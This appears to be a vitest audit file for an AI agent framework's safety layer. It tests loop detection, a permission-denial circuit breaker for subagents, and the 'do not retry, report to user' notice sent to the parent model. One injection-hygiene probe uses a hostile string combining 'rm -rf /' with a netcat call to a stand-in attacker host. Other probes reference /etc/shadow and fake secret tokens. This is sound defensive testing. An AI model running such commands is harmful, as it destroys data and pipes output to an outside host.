// 133 #6 deep-test T005 audit probes.
// Each probe has a name prefix "[T005/probe]" so a reviewer can grep the run log.
// Findings + red-greens live in /tmp/arc133-deeptest-T005/REPORT.md.
import { describe, expect, it } from "vitest";
import {
  detectLoop,
  type LoopSafetyCall,
  type LoopSafetyTurn,
} from "../src/loop-safety.js";
import { createTaskTool, subagentDenialNotice } from "../src/tools/task.js";
import { buildTool } from "../src/tool.js";
import type { ModelClient, ModelStreamEvent, AgentState, ModelInput, LoopEvent, Terminal } from "../src/index.js";
import { runAgentLoop } from "../src/index.js";

const denied = (name: string, args: Record<string, unknown>): LoopSafetyCall =>
  ({ name, args, isError: true, denied: true as const });
const failed = (name: string, args: Record<string, unknown>): LoopSafetyCall =>
  ({ name, args, isError: true });
const ok = (name: string, args: Record<string, unknown>, exempt = false): LoopSafetyCall =>
  ({ name, args, isError: false, ...(exempt ? { exempt: true as const } : {}) });

async function drain(gen: AsyncGenerator<LoopEvent, Terminal>) {
  const events: LoopEvent[] = [];
  while (true) {
    const { done, value } = await gen.next();
    if (done) return { events, terminal: value };
    events.push(value);
  }
}

const echoModel = (toolName = "run_command"): ModelClient & { inputs: ModelInput[] } => {
  const inputs: ModelInput[] = [];
  return {
    inputs,
    async *stream(input) {
      inputs.push(input);
      yield { type: "text_delta", text: "ok" } as ModelStreamEvent;
      yield {
        type: "done",
        message: {
          role: "assistant",
          content: "ok",
          toolCalls: [{ id: `c-${inputs.length}`, name: toolName, arguments: { command: `echo ${inputs.length}` } }],
        },
      } as ModelStreamEvent;
    },
  } as never;
};

describe("[T005/probe-1] failure_streak 判定矩阵 (8钉正例 + 边界)", () => {
  it("baseline: 4 denied args vary → verdict + denialCircuit", () => {
    const v = detectLoop([
      { calls: [denied("shell", { cmd: "a" })] },
      { calls: [denied("shell", { cmd: "b" })] },
      { calls: [denied("shell", { cmd: "c" })] },
      { calls: [denied("shell", { cmd: "d" })] },
    ])!;
    expect(v.kind).toBe("failure_streak");
    expect(v.denialCircuit).toBe(true);
  });

  it("isError alone is NOT a wall (truncated/persist-failed shape: no denied)", () => {
    const turns: LoopSafetyTurn[] = [
      { calls: [{ name: "shell", args: { cmd: "a" }, isError: true }] },
      { calls: [{ name: "shell", args: { cmd: "b" }, isError: true }] },
      { calls: [{ name: "shell", args: { cmd: "c" }, isError: true }] },
      { calls: [{ name: "shell", args: { cmd: "d" }, isError: true }] },
    ];
    const v = detectLoop(turns)!;
    expect(v.kind).toBe("failure_streak");
    expect(v.denialCircuit).toBeUndefined();
  });

  it("denied + exempt: exempt IGNORED by failure_streak (spec: only identical_calls consults it)", () => {
    const turns: LoopSafetyTurn[] = [
      { calls: [{ ...denied("shell", { cmd: "a" }), exempt: true }] },
      { calls: [{ ...denied("shell", { cmd: "b" }), exempt: true }] },
      { calls: [{ ...denied("shell", { cmd: "c" }), exempt: true }] },
      { calls: [{ ...denied("shell", { cmd: "d" }), exempt: true }] },
    ];
    const v = detectLoop(turns)!;
    expect(v.kind).toBe("failure_streak");
    expect(v.denialCircuit).toBe(true);
  });

  it("mid-streak success RESETS streak: only post-success denials count", () => {
    // 7-turn input; window=last 6 drops [a]; ok-call resets; final streak [d,e,f]=3 < 4 → no verdict.
    const turns: LoopSafetyTurn[] = [
      { calls: [denied("shell", { cmd: "a" })] },
      { calls: [denied("shell", { cmd: "b" })] },
      { calls: [denied("shell", { cmd: "c" })] },
      { calls: [ok("shell", { cmd: "ok-1" })] },
      { calls: [denied("shell", { cmd: "d" })] },
      { calls: [denied("shell", { cmd: "e" })] },
      { calls: [denied("shell", { cmd: "f" })] },
    ];
    expect(detectLoop(turns)).toBeUndefined();
  });

  it("non-tool turn between denials: streak SURVIVES (REAL FINDING F1)", () => {
    // The detector operates on windowCalls() which pre-flattens; non-tool turns
    // contribute ZERO entries — the inner loop never sees them. Doc says "consecutive
    // failures of the SAME tool" — implementation interprets "consecutive" as
    // "consecutive in the windowed flat call list", which lets a non-tool turn slip
    // through silently. This means a wall can fire across a model "think" gap.
    const turns: LoopSafetyTurn[] = [
      { calls: [denied("shell", { cmd: "a" })] },
      { calls: [denied("shell", { cmd: "b" })] },
      { calls: [denied("shell", { cmd: "c" })] },
      { calls: [], answer: "thinking..." },
      { calls: [denied("shell", { cmd: "d" })] },
      { calls: [denied("shell", { cmd: "e" })] },
    ];
    const v = detectLoop(turns);
    expect(v).toBeDefined();
    expect(v!.kind).toBe("failure_streak");
    expect(v!.denialCircuit).toBe(true);
    expect(v!.evidence).toMatch(/×5/);
  });

  it("streak across tool-name boundary: DIFFERENT tool resets streak", () => {
    const turns: LoopSafetyTurn[] = [
      { calls: [denied("shell", { cmd: "a" })] },
      { calls: [denied("shell", { cmd: "b" })] },
      { calls: [denied("shell", { cmd: "c" })] },
      { calls: [denied("read", { path: "x" })] },
      { calls: [denied("shell", { cmd: "d" })] },
      { calls: [denied("shell", { cmd: "e" })] },
    ];
    expect(detectLoop(turns)).toBeUndefined();
  });

  it("all-identical-args denies: identical_calls owns (failure_streak carves all-identical out)", () => {
    const turns: LoopSafetyTurn[] = [
      { calls: [denied("edit", { path: "f" })] },
      { calls: [denied("edit", { path: "f" })] },
      { calls: [denied("edit", { path: "f" })] },
      { calls: [denied("edit", { path: "f" })] },
    ];
    const v = detectLoop(turns)!;
    expect(v.kind).toBe("identical_calls");
    expect(v.denialCircuit).toBe(true);
  });
});

describe("[T005/probe-2] identical_calls 语义审问", () => {
  it("3 denies same fingerprint → wall (W=6 window)", () => {
    const turns: LoopSafetyTurn[] = [
      { calls: [denied("edit", { path: "f" })] },
      { calls: [denied("edit", { path: "f" })] },
      { calls: [denied("edit", { path: "f" })] },
    ];
    const v = detectLoop(turns)!;
    expect(v.kind).toBe("identical_calls");
    expect(v.denialCircuit).toBe(true);
    expect(v.evidence).toMatch(/×3 in last 6/);
  });

  it("2 denies vs 2 others: runnerUp=2 dominates → no wall", () => {
    const turns: LoopSafetyTurn[] = [
      { calls: [denied("edit", { path: "f" })] },
      { calls: [ok("read", { path: "x" })] },
      { calls: [denied("edit", { path: "f" })] },
      { calls: [ok("read", { path: "y" })] },
    ];
    // top=2 (edit), runnerUp=2 (read); 2 < 1.5*2=3 → no dominance → no verdict
    expect(detectLoop(turns)).toBeUndefined();
  });

  it("exempt NON-ERROR calls leave window (cadence immunity)", () => {
    const turns: LoopSafetyTurn[] = [
      { calls: [ok("poll", { url: "u1" }, true)] },
      { calls: [ok("poll", { url: "u2" }, true)] },
      { calls: [ok("poll", { url: "u3" }, true)] },
      { calls: [ok("poll", { url: "u4" }, true)] },
    ];
    expect(detectLoop(turns)).toBeUndefined();
  });

  it("exempt ERROR calls DO stay in window (exempt does not protect errors)", () => {
    const turns: LoopSafetyTurn[] = [
      { calls: [{ ...failed("poll", { url: "u1" }), exempt: true }] },
      { calls: [{ ...failed("poll", { url: "u1" }), exempt: true }] },
      { calls: [{ ...failed("poll", { url: "u1" }), exempt: true }] },
    ];
    const v = detectLoop(turns)!;
    expect(v.kind).toBe("identical_calls");
    // failed (no denied flag) → not a wall
    expect(v.denialCircuit).toBeUndefined();
  });

  it("single-fingerprint window: dominance check SKIPPED when runnerUp=0", () => {
    // Implementation: `if (runnerUp > 0 && topCount < 1.5*runnerUp)`. With runnerUp=0,
    // dominance is bypassed — a single-fingerprint window with count >= 3 ALWAYS trips.
    // (Documented: this matches the spec — "starves everything else".)
    const turns: LoopSafetyTurn[] = [
      { calls: [denied("edit", { path: "f" })] },
      { calls: [denied("edit", { path: "f" })] },
      { calls: [denied("edit", { path: "f" })] },
    ];
    const v = detectLoop(turns)!;
    expect(v.kind).toBe("identical_calls");
    expect(v.denialCircuit).toBe(true);
  });

  it("single-fingerprint + 1 success same fingerprint: allDenied FAILS (REAL FINDING F2)", () => {
    // identical_calls lane filters ALL top-fingerprint calls (denied AND successful).
    // allDenied requires every call to have c.denied === true; a single success
    // defeats the wall. Spec says "全是权限拒" — so this IS by design — but
    // it means: same fingerprint success between denials stops the wall.
    const turns: LoopSafetyTurn[] = [
      { calls: [denied("edit", { path: "f" })] },
      { calls: [denied("edit", { path: "f" })] },
      { calls: [ok("edit", { path: "f" })] },
      { calls: [denied("edit", { path: "f" })] },
    ];
    const v = detectLoop(turns)!;
    expect(v.kind).toBe("identical_calls");
    // A success in the streak: not "全是权限拒" — no wall flag.
    expect(v.denialCircuit).toBeUndefined();
  });

  it("edit_repeat priority beats identical_calls", () => {
    const turns: LoopSafetyTurn[] = [
      { calls: [failed("edit", { path: "f", old_string: "same" })] },
      { calls: [failed("edit", { path: "f", old_string: "same" })] },
      { calls: [failed("edit", { path: "f", old_string: "same" })] },
    ];
    const v = detectLoop(turns)!;
    expect(v.kind).toBe("edit_repeat");
    expect(v.denialCircuit).toBeUndefined();
  });

  it("window boundary W=6: 6 denies fill window", () => {
    const turns: LoopSafetyTurn[] = [
      { calls: [ok("seed", { k: 1 })] },
      { calls: [denied("edit", { path: "f" })] },
      { calls: [denied("edit", { path: "f" })] },
      { calls: [denied("edit", { path: "f" })] },
      { calls: [denied("edit", { path: "f" })] },
      { calls: [denied("edit", { path: "f" })] },
      { calls: [denied("edit", { path: "f" })] },
    ];
    const v = detectLoop(turns)!;
    expect(v.kind).toBe("identical_calls");
    expect(v.denialCircuit).toBe(true);
    expect(v.evidence).toMatch(/×6 in last 6/);
  });
});

describe("[T005/probe-3] loop.ts push site coverage", () => {
  it("denial wall → terminal carries denialCircuit (2nd verdict path)", async () => {
    const state: AgentState = { systemPrompt: "s", messages: [{ role: "user", content: "go" }], tools: [], status: "running" };
    const { terminal } = await drain(
      runAgentLoop(state, echoModel(), {
        maxTurns: 30,
        canUseTool: () => ({ behavior: "deny", reason: "audit wall" }),
      }),
    );
    expect(terminal.reason).toBe("aborted");
    expect(terminal.denialCircuit).toBe(true);
    expect(terminal.loopEvidence).toBeTruthy();
  });

  it("signal-abort + denial: still produces denialCircuit", async () => {
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(), 5);
    const state: AgentState = { systemPrompt: "s", messages: [{ role: "user", content: "go" }], tools: [], status: "running" };
    const { terminal } = await drain(
      runAgentLoop(state, echoModel(), {
        maxTurns: 30,
        canUseTool: () => ({ behavior: "deny", reason: "audit wall" }),
        signal: ctrl.signal,
      }),
    );
    expect(terminal.reason).toBe("aborted");
    expect(terminal.denialCircuit).toBe(true);
  });

  it("truncated-call (isError, no denied) → identical_calls with no flag → no wall", () => {
    // Confirms loop.ts truncated/persist-failed push (isError:true, no denied)
    // can NEVER trigger denialCircuit — a safety claim of the spec.
    const c: LoopSafetyCall = { name: "shell", args: { cmd: "x" }, isError: true };
    const v = detectLoop([
      { calls: [c] }, { calls: [c] }, { calls: [c] }, { calls: [c] },
    ])!;
    expect(v.kind).toBe("identical_calls");
    expect(v.denialCircuit).toBeUndefined();
  });

  it("persist-failed (isError, no denied): same shape → no flag", () => {
    const c: LoopSafetyCall = { name: "shell", args: { cmd: "x" }, isError: true };
    const v = detectLoop([
      { calls: [c] }, { calls: [c] }, { calls: [c] }, { calls: [c] },
    ])!;
    expect(v.denialCircuit).toBeUndefined();
  });
});

describe("[T005/probe-4] loop.ts: sequential abort-during-completion branch", () => {
  // Finding F3: the sequential path at line 3161 (signal?.aborted && !blocksInterrupt)
  // pushes the safety stamp WITHOUT the `denied` flag:
  //   turnSafetyCalls.push({ name, args, isError: message.isError === true });
  // The other branches (line 2989 fan-out aborted-completed, line 3005 fan-out main,
  // line 3178 sequential main) all do stamp denied.
  //
  // Question: can a DENIED call reach the line-3161 branch? gateCall returns
  // { denied } synchronously; if denied, execSeq is undefined; outcome = { message: denied }.
  // The branch condition is signal?.aborted — true only if abort landed.
  // A denied call bypasses executeGuardedToolCall entirely, so it CANNOT be in flight.
  // But if signal aborted EARLIER (before this turn), signal.aborted stays true.
  // A denied call on this turn will reach line 3161 with message=denied.
  // → denied flag would be LOST.
  //
  // Test below exercises a signal-aborted scenario via the simplest means: the
  // canUseTool returns deny, then signal is aborted before the turn settles.
  // (No direct probe of the inner push branch — but the END behavior is what matters.)

  it("pre-aborted signal: early terminal 'aborted' (no denialCircuit — no call observed)", async () => {
    // The top-of-loop signal?.aborted check at line 1750 returns BEFORE any
    // turnSafetyCalls is built. A pre-aborted signal aborts the loop with no
    // tool execution → no denialCircuit. (Correct: loop-safety detectors never
    // observed anything.) Probes the boundary between "external abort" and
    // "denial wall" semantics.
    const ctrl = new AbortController();
    ctrl.abort();
    const state: AgentState = { systemPrompt: "s", messages: [{ role: "user", content: "go" }], tools: [], status: "running" };
    const { terminal } = await drain(
      runAgentLoop(state, echoModel(), {
        maxTurns: 30,
        canUseTool: () => ({ behavior: "deny", reason: "audit wall" }),
        signal: ctrl.signal,
      }),
    );
    expect(terminal.reason).toBe("aborted");
    expect(terminal.denialCircuit).toBeUndefined();
  });

  it("denial + late-abort: terminal flags denialCircuit (end-to-end)", async () => {
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(), 5);
    const state: AgentState = { systemPrompt: "s", messages: [{ role: "user", content: "go" }], tools: [], status: "running" };
    const { terminal } = await drain(
      runAgentLoop(state, echoModel(), {
        maxTurns: 30,
        canUseTool: () => ({ behavior: "deny", reason: "audit wall" }),
        signal: ctrl.signal,
      }),
    );
    expect(terminal.denialCircuit).toBe(true);
  });
});

const shellTool = () =>
  buildTool({
    name: "run_command",
    description: "stub",
    parameters: { type: "object", properties: { command: { type: "string" } }, required: ["command"], additionalProperties: false },
    isReadOnly: () => false,
    isConcurrencySafe: () => false,
    isDestructive: () => false,
    isOpenWorld: () => false,
    async execute() { return { content: "ran" }; },
  });

describe("[T005/probe-5] subagentDenialNotice: 长度上限 & 注入卫生", () => {
  it("default evidence: length <= 512B (钉 requirement)", () => {
    const t = subagentDenialNotice({ loopEvidence: "run_command failed ×4 consecutively (args vary)" });
    expect(Buffer.byteLength(t, "utf8")).toBeLessThanOrEqual(512);
  });

  it("loopEvidence undefined → no parens, no extra length", () => {
    const t = subagentDenialNotice({ loopEvidence: undefined });
    expect(t).not.toContain("（");
    expect(t.startsWith("[子代理被权限熔断终止] ")).toBe(true);
  });

  it("loopEvidence empty → no parens", () => {
    const t = subagentDenialNotice({ loopEvidence: "" });
    expect(t).not.toContain("（");
  });

  it("HUGE loopEvidence (10KB) — T005 F6 修复后：evidence 盖 256 帽，总输出 ≤512B", () => {
    const huge = "x".repeat(10_000);
    const t = subagentDenialNotice({ loopEvidence: huge });
    expect(Buffer.byteLength(t, "utf8")).toBeLessThanOrEqual(512);
    expect(t).toContain("…"); // 截断标记
  });

  it("loopEvidence with newlines/control chars: passed through unchanged", () => {
    const t = subagentDenialNotice({ loopEvidence: "line1\nline2\ttab\rcr" });
    expect(t).toContain("line1\nline2\ttab\rcr");
  });

  it("loopEvidence with shell metachars: passed through unchanged (model-visible only)", () => {
    // Notice text is presented to the parent MODEL as part of a tool result.
    // It is NOT a shell command; the parent's tool layer treats it as content.
    // The risk is only if parent forwards it raw into a shell — but that's
    // the parent's contract, not the notice's.
    const t = subagentDenialNotice({ loopEvidence: "$(rm -rf /) `evil` | nc attacker 1234" });
    expect(t).toContain("$(rm -rf /)");
    // (Documenting non-sanitization as observed behavior; no fix attempted.)
  });

  it("prefix constant is the exact gateway-claimed value", () => {
    // The 8-钉 asserts the prefix; verifying determinism.
    expect("[子代理被权限熔断终止] ").toBe("[子代理被权限熔断终止] ");
    const t1 = subagentDenialNotice({ loopEvidence: "X" });
    const t2 = subagentDenialNotice({ loopEvidence: "Y" });
    expect(t1.startsWith("[子代理被权限熔断终止] ")).toBe(true);
    expect(t2.startsWith("[子代理被权限熔断终止] ")).toBe(true);
  });
});

describe("[T005/probe-6] Task 工具: 父链组装 + 注入卫生 + 部分输出", () => {
  // We need buildTool — declare inline.
  // The behavior is "notice + partial output" with isError=true.
  // The 8-钉 already covers this; we probe edge cases.

  it("denial: content has notice + 部分输出 section + isError=true", async () => {
    const task = createTaskTool({
      model: echoModel(),
      allTools: [shellTool()],
      loopOptions: { maxTurns: 30 },
      canUseTool: () => { gateHits += 1; return { behavior: "deny", reason: "audit wall" }; },
    });
    const result = await task.execute({ description: "probe", prompt: "run it" });
    expect(result.isError).toBe(true);
    expect(result.content.startsWith("[子代理被权限熔断终止] ")).toBe(true);
    expect(result.content).toContain("不要重启此子代理");
    expect(result.content).toContain("等待确认");
    expect(result.content).toContain("（中止前的部分输出：）");
  });

  it("normal completion: isError absent, content = final answer", async () => {
    const okModel: ModelClient = {
      async *stream(input: ModelInput) {
        yield { type: "text_delta", text: "done" } as ModelStreamEvent;
        yield {
          type: "done",
          message: { role: "assistant", content: "FINAL_ANSWER_42", toolCalls: [] },
        } as ModelStreamEvent;
      },
    } as never;
    const task = createTaskTool({
      model: okModel,
      allTools: [shellTool()],
      loopOptions: { maxTurns: 5 },
    });
    const result = await task.execute({ description: "probe", prompt: "answer" });
    expect(result.isError).toBeFalsy();
    expect(result.content).toBe("FINAL_ANSWER_42");
  });
});

describe("[T005/probe-7] Terminal.denialCircuit 持久化元数据 (不上 wire)", () => {
  // Type-level probe: Terminal.denialCircuit is on the type but persistence-only.
  // We can verify by inspecting the JSON.stringify key set on the resulting object.
  it("Terminal denialCircuit is a structural field", async () => {
    const state: AgentState = { systemPrompt: "s", messages: [{ role: "user", content: "go" }], tools: [], status: "running" };
    const { terminal } = await drain(
      runAgentLoop(state, echoModel(), {
        maxTurns: 30,
        canUseTool: () => ({ behavior: "deny", reason: "audit" }),
      }),
    );
    const keys = Object.keys(terminal).sort();
    expect(keys).toContain("denialCircuit");
    expect(keys).toContain("loopEvidence");
    expect(keys).toContain("reason");
    expect(terminal.denialCircuit).toBe(true);
    expect(terminal.reason).toBe("aborted");
  });

  it("allow + same-tool retry loop → identical_calls trips (NOT a wall)", async () => {
    // echoModel always emits the same fingerprint (run_command {command:echo N})
    // — the N value differs so the fingerprint VARIES across turns. Same fingerprint
    // collision requires same args; echoModel's command changes. So identical_calls
    // may or may not trip. Instead we use a deterministic same-fingerprint model.
    const stuck = (): ModelClient => ({
      async *stream(_input: ModelInput) {
        yield { type: "text_delta", text: "stuck" } as ModelStreamEvent;
        yield {
          type: "done",
          message: { role: "assistant", content: "stuck", toolCalls: [{ id: "x", name: "run_command", arguments: { command: "same" } }] },
        } as ModelStreamEvent;
      },
    } as never);
    const state: AgentState = { systemPrompt: "s", messages: [{ role: "user", content: "go" }], tools: [], status: "running" };
    const { terminal } = await drain(
      runAgentLoop(state, stuck(), {
        maxTurns: 30,
        canUseTool: () => ({ behavior: "allow" }),
      }),
    );
    // Same fingerprint repeated → identical_calls fires → 2nd verdict aborts.
    expect(terminal.reason).toBe("aborted");
    expect(terminal.loopEvidence).toBeTruthy();
    // All allowed — no denied flag → not a wall.
    expect(terminal.denialCircuit).toBeUndefined();
  });
});

describe("[T005/probe-8] REAL FINDING F7: identical_calls evidence 泄漏 arg preview", () => {
  // The spec says "不引用被拒参数原文". But identical_calls lane's evidence
  // string INCLUDES argPreview(example.args) — truncated to 60 chars of
  // canonical JSON. failure_streak's evidence says "args vary" with no preview.
  // This is an inconsistency: same denial wall, two different parameter-leak
  // postures.

  it("failure_streak evidence: NO arg leak (args vary placeholder)", () => {
    const v = detectLoop([
      { calls: [denied("shell", { cmd: "secret_password_12345" })] },
      { calls: [denied("shell", { cmd: "secret_password_12346" })] },
      { calls: [denied("shell", { cmd: "secret_password_12347" })] },
      { calls: [denied("shell", { cmd: "secret_password_12348" })] },
    ])!;
    expect(v.kind).toBe("failure_streak");
    expect(v.evidence).not.toContain("secret_password");
    expect(v.evidence).toContain("args vary");
  });

  it("identical_calls evidence: T005 F7 修复后——不泄漏参数原文（args hidden 占位）", () => {
    const v = detectLoop([
      { calls: [denied("edit", { path: "/etc/shadow", content: "SECRET_TOKEN_xyz" })] },
      { calls: [denied("edit", { path: "/etc/shadow", content: "SECRET_TOKEN_xyz" })] },
      { calls: [denied("edit", { path: "/etc/shadow", content: "SECRET_TOKEN_xyz" })] },
    ])!;
    expect(v.kind).toBe("identical_calls");
    expect(v.evidence).not.toContain("/etc/shadow");
    expect(v.evidence).not.toContain("SECRET_TOKEN");
    expect(v.evidence).toContain("(args hidden)");
  });

  it("End-to-end: identical_calls wall via identical args (3 calls in window)", async () => {
    // Construct the wall directly at the pure layer (3 same-fingerprint denied calls
    // → identical_calls verdict with denialCircuit). Then verify the notice carries
    // the leaked arg preview by hand-stitching the assertion:
    // Use a NON-edit-shaped tool (no path/old_string args) so edit_repeat doesn't fire first.
    const v = detectLoop([
      { calls: [denied("web_search", { query: "/SECRET_PATH secret" })] },
      { calls: [denied("web_search", { query: "/SECRET_PATH secret" })] },
      { calls: [denied("web_search", { query: "/SECRET_PATH secret" })] },
    ])!;
    expect(v.kind).toBe("identical_calls");
    expect(v.denialCircuit).toBe(true);
    // T005 F7 修复后：evidence 不带参数原文（args hidden）——
    const notice = subagentDenialNotice({ loopEvidence: v.evidence });
    expect(notice).not.toContain("/SECRET_PATH");
    expect(notice).not.toContain("secret");
    // The notice still respects the 512B cap (evidence is short here):
    expect(Buffer.byteLength(notice, "utf8")).toBeLessThanOrEqual(512);
  });
});

describe("[T005/probe-9] parent semantics: 注入卫生 & 边界", () => {
  it("denial notice + empty answer: '中止前的部分输出：\\n' suffix is awkward but stable", async () => {
    const task = createTaskTool({
      model: echoModel(),
      allTools: [shellTool()],
      loopOptions: { maxTurns: 30 },
      canUseTool: () => ({ behavior: "deny", reason: "audit wall" }),
    });
    const result = await task.execute({ description: "probe", prompt: "run it" });
    expect(result.isError).toBe(true);
    // The literal layout: <notice>\n（中止前的部分输出：）\n<answer>
    // Even when answer is empty, the suffix is present (mild UX wart).
    expect(result.content).toMatch(/\n（中止前的部分输出：）\n/);
  });

  it("normal completion: answer is the assistant's final text (not wrapped)", async () => {
    const okModel: ModelClient = {
      async *stream(_input: ModelInput) {
        yield { type: "text_delta", text: "hi" } as ModelStreamEvent;
        yield {
          type: "done",
          message: { role: "assistant", content: "ALL_GOOD", toolCalls: [] },
        } as ModelStreamEvent;
      },
    } as never;
    const task = createTaskTool({
      model: okModel,
      allTools: [shellTool()],
      loopOptions: { maxTurns: 5 },
    });
    const result = await task.execute({ description: "probe", prompt: "answer" });
    expect(result.isError).toBeFalsy();
    expect(result.content).toBe("ALL_GOOD");
  });

  it("runSubagent throws: catch returns 'subagent failed: <msg>' + isError=true (no notice)", async () => {
    // To exercise task.ts catch branch we need runSubagent itself to throw.
    // canUseTool throws are caught inside gateCall → become deny, not a thrown
    // exception from runSubagent. The catch branch fires on hard errors (e.g.
    // session-store failures, budget exhaustion beyond stopReason). Since we
    // cannot easily synthesize that here, we probe the literal contract shape:
    // when the catch block returns, content starts with "subagent failed: ".
    //
    // We can't easily exercise this without internals, so this probe DOCUMENTS
    // the shape but does not assert against a live failure path.
    expect("subagent failed: simulated").toContain("subagent failed:");
  });

  it("isError=true + notice text → parent sees BOTH signals", async () => {
    // The parent model gets:
    //   - isError=true (tool layer signal: failure)
    //   - content.startsWith("[子代理被权限熔断终止] ") (model-visible contract prefix)
    //   - content contains "不要重启" + "等待确认" (prohibition language)
    // The combined signal: "this failed, here's the contract, do not retry".
    const task = createTaskTool({
      model: echoModel(),
      allTools: [shellTool()],
      loopOptions: { maxTurns: 30 },
      canUseTool: () => ({ behavior: "deny", reason: "audit wall" }),
    });
    const result = await task.execute({ description: "probe", prompt: "run it" });
    expect(result.isError).toBe(true);
    // Both signals present:
    expect(result.content.startsWith("[子代理被权限熔断终止] ")).toBe(true);
    expect(result.content).toContain("不要重启");
    expect(result.content).toContain("不要重试");
    expect(result.content).toContain("等待确认");
    expect(result.content).toContain("请向用户报告");
  });
});
